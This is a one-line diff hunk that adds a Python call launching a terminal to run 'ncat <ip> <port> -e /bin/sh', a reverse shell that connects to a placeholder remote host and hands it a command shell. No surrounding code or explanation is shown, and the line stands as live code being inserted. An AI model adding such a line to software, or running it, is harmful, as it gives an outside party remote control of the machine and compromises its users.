@@ -1,0 +1,1 @@
+subprocess.run(["gnome-terminal", "-e", "ncat <ip> <port> -e /bin/sh"])
